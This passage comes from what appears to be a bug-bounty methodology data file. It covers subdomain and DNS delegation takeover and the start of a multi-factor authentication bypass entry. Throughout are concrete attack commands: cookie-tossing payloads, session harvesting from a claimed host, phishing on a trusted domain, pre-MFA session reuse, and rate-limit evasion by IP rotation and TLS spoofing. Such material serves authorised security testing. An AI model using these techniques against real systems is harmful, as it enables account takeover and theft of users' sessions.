          'Be aware of the market. Automated takeover scanning is the most duplicated finding class there is, because hundreds of people run the same fingerprint list against the same programs every day. The edge is in second order takeovers, in vendors nobody has written a signature for, and in monitoring for records that appear or break rather than rescanning records everyone already scanned.',
        ],
        examples: [
          { code: 'echo "<!-- PoC by handle, ticket 1234 -->" > 9f3a1c7d2b.html', note: 'Serve at a random path, never on the index. Include the path and a fetch of it in the report.' },
          { code: 'dig 9f3a1c7d2b-poc.sub.example.com TXT +short', note: 'Zone level proof: an authorised random TXT record you published, which nobody else could have created.' },
          { code: 'Not a finding: vendor 404 with no reachable claim path, a wildcard record, or a name still configured in the vendor account.', note: 'Say in the report which one you ruled out and how.' },
        ],
      },
      {
        heading: 'CNAME to a vendor hostname, and the wildcard amplifier',
        body: [
          'This is the ordinary case. Read the CNAME target, identify the vendor from the suffix, sign up, and add the company hostname as a custom domain in your tenant. The vendor will either accept it, ask for a verification record you cannot create, or tell you the name is already in use, and those three answers are the whole test.',
          'Two configuration details change the outcome. Some vendors key on the exact hostname you add and will happily serve any name pointed at their edge, which is the vulnerable shape. Others require a verification TXT record, or check that the requesting account already proved control of the parent domain, which closes it. Certificate provisioning is a good tell: if the vendor issues a certificate for the hostname automatically once you add it, the vendor is trusting the DNS record alone as proof of control.',
          'A wildcard CNAME turns one dangling record into an unlimited supply. If the parent publishes a wildcard alias to a vendor namespace, then any name you invent under the domain resolves to that vendor, and if you can claim names in the vendor namespace you can mint arbitrary hostnames under the victim domain on demand, choosing whichever name makes your phishing or your allow list bypass most believable.',
        ],
        examples: [
          { code: 'dig shop.example.com CNAME +short   ->   example-shop.myshopify.com', note: 'Identify the vendor from the target suffix, then work the vendor custom domain flow.' },
          { code: 'aws s3api create-bucket --bucket assets.example.com --region us-east-1', note: 'S3 claims are literally a name race: the bucket name must equal the CNAME target. An error tells you it is taken or reserved.' },
          { code: 'CNAME chain:  www.example.com -> cdn.partner.com -> partner-app.herokudns.com', note: 'Check every hop. The first hop can be healthy while a later hop is claimable.' },
          { code: 'dig *.example.com CNAME +short  and  dig anything123.example.com CNAME +short', note: 'A wildcard alias into a claimable vendor namespace means arbitrary attacker chosen hostnames under the victim domain.' },
        ],
      },
      {
        heading: 'A and AAAA records pointing at a released cloud address',
        body: [
          'When a company terminates an instance the public address goes back to the provider pool while the A record stays behind. Whoever next allocates that address inherits the hostname. The exploitation method is to repeatedly allocate and release addresses in the same provider and region until you land on the target address, which academic work on cloud IP reuse showed is practical rather than theoretical.',
          'Be honest with yourself about the economics. A longitudinal study of dangling resource abuse across twelve cloud platforms found roughly twenty one thousand real hijacks and essentially none of them were address takeovers, because attackers go where the claim is cheap. Address reuse costs time and money, can hand you somebody else instance address instead, and many programs treat it as out of scope. Report the dangling record on its merits and only attempt the claim when the program explicitly wants proof.',
          'Detect it by resolving the address, checking whether anything is alive there, and identifying the provider from the ASN. A non responding address is not proof of reclaimability, and an address that answers may simply be a shared vendor edge that routes by Host header, which is the CNAME case wearing different clothes.',
        ],
        examples: [
          { code: 'dnsx -l subs.txt -a -resp -asn -silent', note: 'Resolve and attribute. Addresses inside a cloud provider range with nothing listening are the shortlist.' },
          { code: 'nmap -Pn -sT -p 80,443,22 <ip>   then   curl -sik -H "Host: old.example.com" http://<ip>/', note: 'Distinguish a dead address from a live shared edge that simply has no configuration for this hostname.' },
        ],
      },
      {
        heading: 'NS delegation takeover: the whole zone, and the Sitting Ducks variant',
        body: [
          'An NS record delegates a name and everything under it. If the delegation points at nameservers the attacker can control, the attacker becomes authoritative for that namespace and can publish any record in it: A, AAAA, MX, TXT, SPF, DKIM, CAA, and names that never existed. That is why this variant is the worst case and why it is scored so much higher than a claimed helpdesk page.',
          'Two ways in. First, the base domain of one of the nameserver hostnames has expired and can simply be registered, at which point you run the nameserver. Second, the delegation points at a managed DNS provider that no longer holds a zone for that name, and the provider lets a different account create that zone on nameservers matching the existing delegation. Infoblox and Eclypsium documented this second pattern at scale under the name Sitting Ducks, and the point they make is that the contested resource is the hosted zone at the provider, not the domain registration.',
          'Query the parent, not a recursive resolver, because a recursive answer can be cached or child side. Get the delegation from the parent nameserver, then ask each delegated server directly for the zone SOA and look for an authoritative answer. SERVFAIL, REFUSED, a timeout, or an answer without the aa flag all mean the delegation is broken, and none of them mean the zone is claimable. That last step is a separate check against the provider signup process.',
          'Provider status is where common belief is most out of date. Matthew Bryant took over roughly one hundred and twenty thousand domains in 2016 by repeatedly creating and deleting zones until a provider handed back a matching nameserver set, and that result is quoted as if it still generalises. It does not. The can-i-take-over-dns project currently records Route 53 and Cloudflare as not vulnerable, Azure and Google Cloud as edge cases, and DigitalOcean, DNSMadeEasy, Hurricane Electric, Linode, TierraNet and Reg.ru as vulnerable. Check the provider before you build a theory on it.',
          'Partial delegation changes the impact rather than removing it. If you control only some of the delegated nameservers, resolvers will sometimes ask a healthy server and sometimes ask yours, so your answers appear intermittently. That is still exploitable, and a long TTL on your answer keeps it in caches after the fact, but the write up needs to describe it honestly as probabilistic.',
        ],
        examples: [
          { code: 'dig example.com NS +short', note: 'Start at the parent. Note the base domains of every nameserver hostname and check each one is still registered.' },
          { code: 'pns=$(dig +short example.com NS | head -1); dig @${pns%.} sub.example.com NS +norecurse +noall +answer +authority', note: 'Read the delegation from the parent side, because a recursive query can return cached or child side data.' },
          { code: 'dig @ns1.provider.net sub.example.com SOA +norecurse +noall +comments +answer +authority', note: 'A correctly configured server answers authoritatively for the zone apex. Look for the aa flag and a SOA.' },
          { code: 'whois ns-provider-domain.com | grep -iE "expir|status|no match"', note: 'The expired nameserver base domain path: if it is registrable, registering it gives you the nameserver.' },
          { code: 'docker run -it --rm -v $(pwd):/etc/dnsreaper punksecurity/dnsreaper file --filename /etc/dnsreaper/roots.txt', note: 'dnsReaper carries NS and multi record type signatures, so it is the scanner for this class. The dig recipes above remain the authoritative check, and can-i-take-over-dns decides whether the provider will hand you a matching nameserver set.' },
          { code: 'Do not create the zone without permission.', note: 'Claiming it starts answering for production names and can break DNS for the whole delegated namespace.' },
        ],
      },
      {
        heading: 'Second order takeover: the dangling name is not in the target zone',
        body: [
          'The dangling host does not have to belong to the target. If the target application loads a script, a stylesheet, a font or a pixel from a hostname that is dead, whoever claims that hostname executes code inside the target origin on every page load. The best candidates are inside JavaScript bundles, where an integration was removed from the vendor side years ago and the tag was never deleted, so the browser fails the fetch quietly and nobody notices. Sometimes the host is not a subdomain at all but a whole registrable domain that lapsed, which costs about ten dollars to buy.',
          'Extend the same idea to every allow list the application maintains. A CORS allow list, a CSP source list, an OAuth redirect_uri registration, an SSO assertion consumer or metadata URL, a webhook destination, an SPF include, an MX target, or a cookie Domain value can all name a host that is now claimable, and each one converts the takeover into whatever that allow list was protecting.',
          'The SPF and MX cases are worth calling out because they are mail, not web, and because they are the ones a CNAME claim cannot give you. An SPF record that includes a domain nobody registered any more lets the person who registers it publish sending addresses that make mail from the organisation pass SPF, and pass DMARC alignment with it. An MX target that is registrable or claimable lets the same person receive inbound mail for the name, which is where password resets and mailed one time codes go.',
          'Enumerate this by crawling and reading, not guessing. Pull every absolute host referenced by the site JavaScript, HTML and headers, resolve all of them, and check the ones that fail. Do the same for the TXT and MX records of the parent and of every SaaS domain the company publishes.',
        ],
        examples: [
          { code: 'katana -u https://example.com -jc -silent | tee urls.txt', note: 'Crawl including JavaScript so script sources and fetch targets end up in the list.' },
          { code: 'grep -Eoh "https?://[a-zA-Z0-9._-]+" app.*.js | sort -u | dnsx -rcode nxdomain,servfail -resp -silent', note: 'Every third party host the bundle references, filtered down to the ones that no longer resolve.' },
          { code: 'curl -sI https://example.com | grep -iE "content-security-policy|access-control-allow-origin"', note: 'Read the allow lists. Any named host in script-src or a reflected origin list is a takeover target.' },
          { code: 'dig example.com TXT +short | grep spf   then check every include: and redirect= target with whois', note: 'An include of an unregistered domain is a sender authorisation you can buy.' },
          { code: 'dig example.com MX +short   then   whois each MX target base domain', note: 'MX targets that are expired and registrable let you receive mail for the name. There is no scanner flag for this; it is the same whois check as the SPF include chain above.' },
        ],
      },
      {
        heading: 'What a trusted origin buys you',
        body: [
          'Cookies come to you for free. Any cookie the application set with Domain=example.com is attached by the browser to requests for every host under that domain, including the one you just claimed, so simply logging request headers on your tenant harvests sessions from anyone you can get to load the hostname. HttpOnly does not help, because the browser is sending the cookie rather than script reading it, and Secure does not help, because you have valid TLS. Host only cookies, which is what you get when Domain is omitted, are not sent and are the actual defence. This is exactly the ping.ubnt.com pattern: a dangling CNAME plus single sign on cookies scoped to the parent domain equals session theft.',
          'Cookies also go the other way, which is the part people miss. A page on a host you control can set a cookie with Domain set to the parent, and the parent will accept it: MDN states plainly that a response from api.example.com may set Domain=example.com. The Cookie header the server later receives carries only name and value, with no indication of which host set it or what its Domain and Path were, so the application cannot tell your cookie from its own. That is cookie tossing, and it gives you write access to session state without any flaw on the target itself. Scope the tossed cookie to a single Path so only the endpoint you care about sees the forged value, which is how the published Gitpod OAuth hijack worked. If the genuine cookie is in the way, overflow the jar: browsers cap cookies per domain, Chromium at one hundred and eighty, and evict least recently used, so you can push the real one out and leave yours. The Session Fixation entry has the mechanics behind all of that: why your cookie coexists with the real one instead of replacing it, the RFC 6265 ordering rule that decides which is sent first, and how to test whether the target parser takes the first occurrence or the last. What this entry adds is that a takeover hands you the write primitive outright, with no injection flaw anywhere on the target.',
          'SameSite is not a defence here, because a host under the same registrable domain is same-site with its siblings even though it is not same-origin. Requests you initiate from the claimed host carry Lax and Strict cookies, so the classic answer to CSRF stops applying and only a properly validated anti CSRF token or an Origin check saves the endpoint.',
          'Then there are the allow lists. A CORS policy that matches a domain suffix now matches you, so your script reads authenticated responses cross origin; see the CORS Misconfiguration entry for how to exercise that. A CSP script-src that trusts the domain now trusts you, so a previously useless HTML injection becomes same origin script execution. An OAuth client that registered a wildcard or suffix matched redirect_uri now accepts a callback you own, so authorisation codes are delivered to you; the OAuth entry covers what to do with the code once you have it. This entry is the part that comes first: how the origin became yours.',
          'Finally, phishing on the real domain. The address bar shows the company name, the certificate is valid because the vendor provisioned one for the hostname you added or because you passed an HTTP-01 challenge on a path you control, and mail filters and proxies that allow list the company domain let the link through. Compared to a lookalike domain this is a different category of credibility, and it is the impact most programs accept without argument. This is where Authentication Bypass stops and this entry goes further: authentication bypass defeats a check, whereas this makes the attacker infrastructure part of the trusted namespace so the checks are passed legitimately.',
        ],
        examples: [
          { code: 'Log the request: any Cookie header arriving at the claimed host contains every Domain=example.com cookie.', note: 'Session theft with no script and no interaction beyond loading a URL. HttpOnly is irrelevant to it.' },
          { code: "document.cookie = 'session=ATTACKER; domain=example.com; path=/; secure'", note: 'Cookie tossing. The parent cannot distinguish this from a cookie it set itself.' },
          { code: 'Set-Cookie: session=ATTACKER; Domain=example.com; Path=/auth/callback; Secure; SameSite=Lax', note: 'Path scoped tossing: only the OAuth callback sees the forged session, so the rest of the victim session looks normal.' },
          { code: 'Defence to check for: __Host-session=...; Secure; Path=/  with no Domain attribute', note: 'The __Host- prefix forbids a Domain attribute, so no sibling host can set or shadow that cookie name.' },
          { code: 'Origin: https://claimed.example.com   against an endpoint whose allow list matches *.example.com', note: 'Suffix matched CORS and CSP allow lists now include the attacker host.' },
          { code: 'https://claimed.example.com/login  serving a copy of the real login form under a valid certificate', note: 'Phishing that survives inspection of the URL and the padlock, on a domain that mail filters trust.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'Run DNS classification first and HTTP fingerprinting second, because the two find different bug classes and the HTTP only tools are structurally blind to the NXDOMAIN class. A workable pipeline is subfinder or certificate transparency for names, dnsx to resolve and split by record type and response code, httpx to get status, title and certificate, then the takeover specific scanners over what survives.',
          'nuclei carries a large set of vendor takeover templates and is the fastest way to cover the known fingerprints. subjack is an HTTP fingerprint scanner and nothing more: its entire flag set is -a -c -d -m -o -ssl -t -timeout -v -w, so it does not do NS delegation, stale A records, zone transfers, SRV, CNAME chains, SPF or MX, and any recipe claiming otherwise is inventing flags. dnsReaper is the one that does cover NS and multiple record types, is signature rich, and can also run against your own DNS provider with credentials, which is the defensive mode. For the NS and mail cases the dig and whois recipes above are the real check. subzy matches the can-i-take-over-xyz fingerprints. Whatever you run, confirm by hand: every one of these tools reports fingerprints, and a fingerprint is a lead.',
          'Reference lists to keep open, and to treat as references rather than truth: can-i-take-over-xyz for vendor services and can-i-take-over-dns for DNS providers. Both say in their own text that entries go stale and that you must perform the proof yourself.',
          'For finding what everyone else is not finding, monitor instead of scan. Diff the resolved record set for the estate on a schedule and alert on records that newly start failing, because the window between a resource being deleted and the record being cleaned up is where the undiscovered findings are.',
        ],
        examples: [
          { code: 'nuclei -l live.txt -t http/takeovers/ -silent', note: 'Around seventy vendor specific takeover templates. -tags takeover selects the same set from a full template run.' },
          { code: 'subjack -w subs.txt -t 100 -timeout 30 -ssl -a -o results.json', note: '-a requests every URL rather than only ones with a CNAME, which is what the tool itself recommends.' },
          { code: 'docker run -it --rm -v $(pwd):/etc/dnsreaper punksecurity/dnsreaper file --filename /etc/dnsreaper/subs.txt', note: 'dnsReaper over a file of names, writing results.csv. It also has aws, cloudflare and azure modes for defenders.' },
          { code: 'subzy run --targets subs.txt --hide_fails --https', note: 'can-i-take-over-xyz fingerprint matching with the noise suppressed.' },
          { code: 'dnsx -l subs.txt -recon -json -silent -o today.json  then diff against yesterday.json', note: 'Continuous monitoring beats rescanning: the finding is created the moment a resource is deleted.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Be the origin: serve content from a genuine company hostname under a valid certificate, so the address bar, the padlock and the certificate transparency log all corroborate the brand, and mail filters and proxies that allow list the domain pass the link through.',
          'Be the user by collection: any cookie the app set with Domain scoped to the parent is attached automatically to requests for the claimed host, so logging request headers harvests live sessions, with HttpOnly and Secure providing no protection against it.',
          'Be the user by injection: toss a session cookie scoped to the parent domain so the victim browses inside an attacker owned session, then capture what they enter, or wait for them to link an identity provider or payment method into the account you control.',
          'Be the client application in an OAuth flow: a redirect_uri allow list that matches a subdomain or a suffix now accepts a callback you own, so the victim authorisation code is delivered to attacker infrastructure.',
          'Be a trusted origin to the code the site already runs: pass CORS and CSP checks that are written as a domain suffix, so attacker script speaks with the authority of the application rather than of an unrelated site.',
          'Be the application code itself: second order takeover of a host in a script tag executes attacker JavaScript inside the real origin with the victim session attached, which is indistinguishable from code the company shipped.',
          'Be the sender: register the domain named in an SPF include and publish sending addresses, so mail from the organisation domain passes SPF and satisfies DMARC alignment.',
          'Be the recipient: with mail routing control, through a claimable MX target or zone level control, receive password reset links and mailed one time codes addressed to the domain and complete resets as the account owner.',
          'Be the zone: an NS delegation takeover answers authoritatively for every name underneath it, so records can be forged for hosts that were never dangling, and a DNS-01 challenge mints a publicly trusted certificate for any of them.',
          'Be the partner or the internal service: allow lists keyed to the domain, such as webhook destinations, SSO metadata and assertion consumer URLs, and partner API checks, accept the claimed host as the legitimate counterparty.',
        ],
        why: 'Every trust decision on the web is keyed to a name rather than to an operator, so cookie scope, CORS and CSP allow lists, OAuth registrations, SPF authorisation and same-site classification all authorise by hostname or registrable domain; taking over a name transfers that trust wholesale, without the attacker ever touching the organisation servers.',
      },
      tampering: {
        weaponization: [
          'Toss a cookie scoped to the parent domain to overwrite state the server trusts, including session identifiers, cart contents, discount state, locale, feature flags and experiment assignment, with no injection flaw on the target at all.',
          'Path scope the tossed cookie so only one endpoint, typically an authentication callback, receives the forged value while the rest of the session behaves normally and the tampering is invisible in the UI.',
          'Overflow the cookie jar, exploiting the per domain cookie cap and least recently used eviction, so the genuine cookie is discarded and only the attacker value remains.',
          'Fix the anti CSRF token by tossing your own cookie, defeating the double submit pattern, since the submitted token then matches the cookie borne token the server compares against.',
          'Serve altered JavaScript or CSS from a host the production site loads, changing the behaviour of the real application for every visitor without touching the application code.',
          'With zone level control, rewrite any record in the namespace: repoint A and AAAA records, replace MX, publish a DKIM key or a CAA record, and create names that never existed.',
        ],
        why: 'Cookies and subresources are accepted on the strength of the domain they came from, and the Cookie header tells the server only a name and a value with no indication of which host set it, so a foothold anywhere under the registrable domain becomes write access to state the application treats as its own.',
      },
      information_disclosure: {
        weaponization: [
          'Read authenticated cross origin responses wherever the CORS allow list matches the domain suffix rather than an exact origin, using the victim session from a page they trust.',
          'Collect whatever the organisation still sends to the dead host without knowing it: Referer headers, query strings in inbound links, tracking beacons, webhook deliveries, mobile application callbacks and error or telemetry posts that were never switched off.',
          'Exfiltrate the DOM, local storage and in page tokens by executing script in the real origin through a second order takeover of a script source.',
          'Intercept inbound mail where an MX target or mail vendor name is claimable, exposing password resets, invoices, vendor correspondence and internal threads.',
          'With zone level control, mint a certificate for a production hostname through a DNS-01 challenge and terminate TLS for clients that resolve through the hijacked delegation, reading traffic meant for the real service.',
        ],
        why: 'Data keeps flowing to a hostname long after the resource behind it is gone, and neither the browser nor the backend that sends it has any way to notice that the name changed hands, so the attacker simply receives what the organisation is still addressing to itself.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Pass allow lists written as a domain suffix rather than an exact host: server side request forgery filters, webhook destination checks, egress proxy rules and partner API checks that permit anything under the company domain.',
          'Turn an otherwise unexploitable HTML injection into same origin script execution where the CSP script-src list trusts the domain, because the attacker host is now a permitted script source.',
          'With zone level control, answer a name the backend trusts with an internal or loopback address, defeating request forgery protections that validate the hostname against an allow list and then resolve it separately.',
          'Reach internal applications that gate access on a session cookie scoped to the company domain, where being inside the cookie scope is treated as being inside the perimeter.',
        ],
        why: 'Access control rules that are expressed as a domain suffix silently authorise every name in the namespace, so acquiring any one name inside it grants whatever the rule was protecting, without defeating the rule itself.',
      },
      denial_of_service: {
        weaponization: [
          'With a hijacked delegation, answer NXDOMAIN or point the apex elsewhere, removing the site from the internet for the length of the record TTL and beyond, since caches keep serving the attacker answer after access is revoked.',
          'Replace MX records to black hole inbound mail, which also stops password resets and mailed one time codes and therefore blocks account recovery.',
          'Serve a broken, enormous or hostile file from a host the production site loads as a subresource, degrading or breaking the application for every visitor.',
        ],
        why: 'Control of the name is control of whether the service can be reached at all, and because DNS answers are cached with attacker chosen lifetimes, an outage introduced this way outlives the moment the attacker is cut off. In an authorised test none of these should be demonstrated: show that you can publish a record, not that you can remove the domain from service.',
      },
    },
  },

  {
    id: 'mfa-bypass',
    name: 'Multi-Factor Authentication Bypass',
    summary: 'Reach the fully authenticated state without presenting a valid second factor, by skipping the challenge, forging or replaying the code, guessing it, or entering through a route that never asks for it.',
    tags: ['authentication', 'session', 'business-logic'],
    executionContext: {
      where: 'In the server side session state machine, at the transition from the partially authenticated state (password accepted, second factor pending) to the fully authenticated state.',
      detail: 'Almost nothing here is a break in the cryptography of TOTP, WebAuthn, or the SMS gateway. The flaw lives in the application authentication controller and its session store, in how the pre-authentication session is created, what it is allowed to do before the challenge is answered, and how the submitted code is bound to an account, a session, a purpose, and a clock. That binding is server side state, so the exploit executes on the application server even when the request looks like a normal browser navigation. Three variants execute elsewhere and are worth separating. Response manipulation executes entirely in the victim or attacker browser: the gate is a client side conditional and the server was never consulted, so proving it requires showing that the resulting cookie works from a clean client. Trusted device bypass executes at session establishment, when the server reads a cookie the attacker holds and decides not to challenge. Alternate route bypass executes on a completely different code path, a social login callback, a legacy API version, an old subdomain, or a non HTTP protocol, that resolves identity without ever consulting the MFA policy the main login enforces.',
    },
    howTo: [
      {
        heading: 'Root cause, and where this entry stops',
        body: [
          'A second factor exists to make a stolen or guessed password insufficient. The application therefore has to hold a third state between anonymous and authenticated: password verified, challenge outstanding. Every bug in this class is the application getting that middle state wrong. It grants the middle state too much power, it lets the client choose which account the middle state refers to, it accepts a code that was minted for a different account or a different purpose or an hour ago, it never counts the guesses, or it offers a second door into the account that never passes through the middle state at all.',
          'This entry assumes you already hold or can obtain the first factor: a password from a credential dump, a reused password, a phished password, or your own password on your own second test account. That assumption is what separates it from the Authentication Bypass entry, which is about getting in with no valid credentials at all. Where an OAuth or OIDC login route is the bypass, the flaw here is that the relying party accepts a federated session at a lower assurance level than its own password plus MFA path; the attacks on the OAuth dance itself (redirect_uri matching, state, code binding) belong to the OAuth 2.0 / OpenID Connect Abuse entry. The synchronization mechanics for the race variants are in the Race Condition entry. The account selector rewrite is an IDOR on the verification step, and disabling the second factor through a forged cross site request is CSRF; both are listed here because they are how this specific gate falls, not because they are new classes.',
          'Impact framing matters when you report it. On its own, an MFA bypass is only as severe as the first factor you needed. Chained with a public credential dump, a password reset flaw, or an existing session leak, it is full account takeover, and programs that pay premium bounties for this class pay for the chain, not the individual step.',
        ],
      },
      {
        heading: 'Map the flow before you touch it',
        body: [
          'Create two accounts you control, A and B, and enable every available factor on both. Enrol different factor types if the app offers them, because the strength of MFA is the strength of the weakest enrolled factor, and the fallbacks are usually where the bug is. Then capture a complete, successful login on account A in a proxy with nothing filtered out, including redirects, XHR, and Set-Cookie headers.',
          'Identify three things from that capture. First, the state carrier: what changes between step one and step two? A brand new session cookie, the same cookie with a server side flag, a short lived transaction identifier in the body, a signed token in a hidden field, or a header. Second, the account selector: does any part of the step two request name the account being verified? A verify parameter, an account cookie, a userId or email in the JSON body, or a flow identifier that decodes to a user. Third, the route inventory: list every way to reach an authenticated session, not just the one the login page uses.',
          'Build the route inventory deliberately, because most of the highest impact findings live in it: the web password login, the mobile client login endpoint, each social or SSO button, the password reset completion, the email verification or magic link, any legacy API version visible in the JavaScript bundle, any older subdomain, and any non HTTP protocol the product exposes. Every one of those has to enforce the same policy, and they are usually implemented by different people at different times.',
        ],
        examples: [
          { code: 'POST /login          username=a&password=b     ->  302 /login2, Set-Cookie: session=PRE_MFA', note: 'Step one. Record the exact cookie, because the whole question is what that cookie can already do.' },
          { code: 'GET  /login2                                    ->  200, challenge page (note any account name echoed back)', note: 'Look for a verify, account, userId, flowId, transaction_id, or stateToken value you can edit.' },
          { code: 'POST /login2         mfa-code=123456            ->  302 /my-account, Set-Cookie: session=FULL', note: 'Step two. Diff the pre and post cookies: same value with a server flag, or a fresh value?' },
          { code: "Route inventory:  /login  /api/mobile/v2/login  /auth/google/callback  /reset-password  /verify-email  /api/v1/*  old.target  m.target", note: 'Each entry is a separate test. MFA enforcement is per route, not per application.' },
        ],
      },
      {
        heading: 'Variant 1 and 2: forced browsing past the step, and the session that is already fully authenticated',
        body: [
          'The simplest and still the most common finding. If step one issues a session and step two only decides what page you are shown, the second factor is decoration. Take the cookie you were given after the password and request an authenticated resource directly. Do it against the HTML route and against the JSON API separately, because a route guard bolted onto the server rendered pages very often does not cover the API the single page app calls.',
          'These are two different defects with the same test. In forced browsing, the pre-authentication session is a distinct, limited session and the flaw is that some endpoints do not check its limitation. In the second case the application actually issued a full session at step one and the challenge page is purely presentational, which is worse because every endpoint is exposed and the fix is architectural.',
          'Test the weaker proofs of completion too. Some applications accept the correctly spelled Referer header as evidence that the challenge page was passed, or trust a client supplied state field naming which stage the flow is in. The real product case is Proxmox VE, CVE-2023-54391: libpve-access-control before 8.0.4, on Proxmox VE 7.0 through 8.0, let an unauthenticated attacker authenticate as any existing enabled user that had no second factor configured, simply by supplying an arbitrary tfa-challenge value to the API login endpoint. Neither a header nor a client field is proof of anything, and if either changes the outcome you have the bug.',
          'Do not stop at a 200. Confirm the session can perform a state changing action, because some apps allow reads before the challenge but block writes, and a report that only shows a rendered page invites an informative close.',
        ],
        examples: [
          { code: "curl -si -b 'session=PRE_MFA' https://target/my-account | head -1", note: 'A 200 means step two is decorative for the server rendered route.' },
          { code: "curl -si -b 'session=PRE_MFA' https://target/api/v1/me", note: 'Test the API separately. The guard is frequently only on the HTML routes.' },
          { code: "curl -si -b 'session=PRE_MFA' -X POST -H 'Content-Type: application/json' -d '{\"name\":\"changed\"}' https://target/api/v1/me", note: 'Prove a write, not only a read, or the finding will be downgraded.' },
          { code: "curl -si -b 'session=PRE_MFA' -H 'Referer: https://target/login2' https://target/dashboard", note: 'If adding the Referer changes the result, navigation metadata is being used as proof of MFA.' },
          { code: "curl -si -b 'session=PRE_MFA' -X POST -d 'tfa_state=passed' https://target/api/ticket", note: 'Illustrative placeholder only, not a real parameter on any product: substitute whichever stage or state field the target actually sends. A client selected stage must never be trusted; compare the response to the same request without it.' },
          { code: "POST /api2/json/access/ticket    username=root@pam&realm=pam&tfa-challenge=anything     (Proxmox VE CVE-2023-54391, libpve-access-control < 8.0.4)", note: 'The real shape, and a real parameter name: supplying an arbitrary challenge value authenticated any enabled user that had no second factor configured.' },
        ],
      },
      {
        heading: 'Variant 3: response manipulation and client side only gates',
        body: [
          'When the client decides whether the challenge succeeded, you win by rewriting what the client sees. Submit a deliberately wrong code, intercept the response, and flip the field the front end branches on. Burp Match and Replace makes this repeatable so you can walk the whole flow with the rule armed rather than intercepting each response by hand.',
          'The same trick applies to policy gates that are not the login itself. A disclosed HackerOne report against Omise (report 3356149) describes an organizational rule that required the acting user to have 2FA enabled before inviting new members; flipping the enforcement field from false to true in the response let the invite proceed. That is the client side variant of a step up requirement, and it is worth testing every place the interface says you must enable 2FA before doing something.',
          'This is also the variant most often over claimed. Flipping a field in your own browser proves nothing by itself. The finding is real only if the server subsequently accepts the state you reached: take whatever cookie or token the flow produced and replay it from a clean client with no proxy rules. If it fails there, you fooled your own browser and the server was never the problem.',
        ],
        examples: [
          { code: 'Burp Match and Replace (response body):   "mfaRequired":true   ->   "mfaRequired":false', note: 'Armed as a rule so it applies to every response in the flow, not one intercept.' },
          { code: 'Burp Match and Replace (response body):   "success":false   ->   "success":true', note: 'Classic client trusted verdict on the code submission.' },
          { code: 'Burp Match and Replace (response header): HTTP/1.1 401 Unauthorized   ->   HTTP/1.1 200 OK', note: 'Some front ends branch on the status alone and proceed to mint or unlock the session.' },
          { code: 'Burp Match and Replace (response body):   "twoFactorEnabled":false   ->   "twoFactorEnabled":true', note: 'The Omise pattern: a policy gate that asks the client whether the actor is compliant.' },
          { code: "curl -si -b 'session=RESULT_OF_THE_FLIPPED_FLOW' https://target/api/v1/me", note: 'The only step that turns this from a screenshot into a finding.' },
        ],
      },
      {
        heading: 'Variant 4: the code is not bound to a user, a session, a purpose, or a clock',
        body: [
          'A one time code is only a second factor if it is tied to exactly one account, generated for exactly one session, valid for exactly one purpose, usable exactly once, and dead after a short window. Test all five bindings separately, because implementations fail them independently.',
          'Account binding is the highest value test. If any part of the step two request names the account, rewrite it. The PortSwigger 2FA broken logic lab is the canonical shape: a verify parameter travels with both the request that generates the code and the request that checks it, so you can make the application mint a code for the victim, log in as yourself to keep a live flow, and then submit guesses against the victim name. The same defect appears with the selector in a cookie. Separately, test the cross account case with no rewriting at all: request a code on your own account, where you actually receive it, and submit that code inside a login flow opened against the victim. A disclosed private program finding described exactly this, an attacker authenticating as another user with their own MFA code, because verification was not tied to the user being authenticated.',
          'Session binding is the transplant test. Open two flows in two browsers, complete the challenge in one, and move the resulting artefact (the cookie, an mfa_verified flag, a signed completion token) into the other. If the completion state travels, it is not bound to the pre-authentication session it was issued for.',
          'Purpose binding is frequently missing and rarely tested. Applications often use one code table for login, phone verification, email change confirmation, and transaction approval. A code that arrives labelled "confirm your phone number" and is accepted at the login challenge is a purpose binding failure, and it matters because the phone verification surface usually has weaker limits than the login surface.',
          'Then the boring two: single use and expiry. Submit an accepted code a second time. Submit a code after thirty minutes, after an hour, and after a day. Codes that never expire turn a single observed SMS, a shoulder surf, or an old screenshot into a permanent key. Finally, check construction: collect fifteen or twenty codes back to back and look at the deltas. If they are sequential, derived from a timestamp, or reproducible from the user id, they are not secrets at all.',
          'And check the obvious leak: the code appearing in the very response that is supposed to send it out of band. Grep every response in the flow, including the resend endpoint, the challenge page HTML, any Set-Cookie value, and any debug or error field.',
        ],
        examples: [
          { code: 'GET  /login2?verify=victim       then      POST /login2   verify=victim&mfa-code=0000', note: 'PortSwigger 2FA broken logic: the account selector rides both requests, so you name the account and guess its code.' },
          { code: 'POST /login-steps/second     Cookie: account=victim-user     verification-code=123456', note: 'Same defect with the selector in a cookie you fully control.' },
          { code: 'Cross account: get a real code on your account A, submit it in a flow opened for victim B.', note: 'If it is accepted, the OTP is not bound to a user. No parameter tampering required.' },
          { code: 'Purpose reuse: trigger "confirm your phone" on your account, submit that code at the login challenge.', note: 'One code table shared across purposes, and the weaker surface sets the effective security level.' },
          { code: 'Transplant: complete MFA in session A, copy session/mfa_verified into session B, request /my-account.', note: 'Tests whether the completion state is bound to the pre-authentication session.' },
          { code: 'Replay: submit an already accepted code again. Delay: submit a code after 30m, 1h, and 24h.', note: 'Single use and TTL. Both are required; either alone is not enough.' },
          { code: "grep -Eio '\"(otp|code|pin|token|mfa_code|verificationCode)\"\\s*:\\s*\"[^\"]+\"' responses.txt", note: 'The code leaking into the response body, a cookie, or a debug field ends the test immediately.' },
        ],
      },
      {
        heading: 'Variant 5: brute forcing the code, and how to actually verify a rate limit',
        body: [
          'A six digit numeric code is one million possibilities and a four digit code is ten thousand. Those numbers are only safe because of the attempt limit, so the attempt limit is the control you are testing, not the code. Never conclude "rate limited" from a 429 you saw on attempt twenty. Enumerate the specific defences and defeat each one on purpose.',
          'A lockout that only counts per source IP is not a lockout, it is a speed bump. Test whether the application derives the client address from a forwarding header, and if it does, rotate a fresh value per request. If it does not, rotate the actual source: FireProx or OmniProx put each request through a different cloud egress address, and providers that hand out an IPv6 /64 give you effectively unlimited addresses. PayloadsAllTheThings also notes TLS fingerprinting (JA3) as a detection layer that survives IP rotation, so if requests from a proxy are blocked while an identical browser request is not, spoof the handshake with curl-impersonate or drive a real browser.',
